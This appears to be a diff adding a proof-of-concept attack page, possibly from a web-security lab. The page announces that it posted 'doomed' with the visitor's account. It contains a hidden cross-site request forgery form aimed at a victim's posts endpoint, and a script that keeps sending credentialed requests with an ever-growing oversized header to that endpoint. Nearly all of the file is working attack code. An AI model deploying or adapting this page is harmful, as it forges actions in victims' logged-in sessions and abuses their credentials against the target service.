@@ -1,0 +1,64 @@
+<!doctype html>
+<html><body>
+    <h3> I posted "doomed" with your account! </h3>
+    <!-- Fill me -->
+    <iframe id="invisible" name="invisible" src="/"></iframe>
+    <form id='mal'
+      target="invisible"
+      style="width=0px; height=0px"
+      action="http://example.net:8888/victim/posts" method='GET'>
+      <input 
+      style="width=0px; height=0px"
+      type="text" id='post_victim' name='post_victim' value="doomed"/>
+    </form>
+    <div id="cons"></div>
+    <script>
+var x = "a";
+var len = 9000;
+for (var i = 0; i < len; i++) {
+  x += "a";
+}
+
+//document.getElementById("post_victim").value = x
+//document.getElementById("mal").submit();
+var s = "a";
+var httpRequest;
+function makeRequest() {
+  httpRequest = new XMLHttpRequest();
+
+  var i = 8100;
+  for (var i = 0; i < 8100; i += 1) {
+    s += "a";
+  }
+  if (!httpRequest) {
+    alert('Failed to create httpRequest');
+  }
+
+  httpRequest.onreadystatechange = alertContents;
+  httpRequest.open('GET', 'http://example.net:8888/victim/posts');
+  //httpRequest.open('GET', 'http://example.org:4444/');
+  httpRequest.setRequestHeader("mal",s);
+  httpRequest.withCredentials = true;
+  httpRequest.send(null);
+}
+function alertContents() {
+  if (httpRequest.readyState == XMLHttpRequest.DONE) {
+    if (httpRequest.status == 200) {
+      //alert(httpRequest.responseText);
+      s += "a";
+        i += 1;
+      document.getElementById('cons').innerHTML=i;
+
+      httpRequest.open('GET', 'http://example.net:8888/victim/posts');
+      httpRequest.setRequestHeader("mal",s);
+  httpRequest.withCredentials = true;
+  httpRequest.send(null);
+    }
+    else {
+      alert('somthing is wrong: with i=' + i);
+    }
+  }
+}
+makeRequest();
+  </script>
+</body></html>
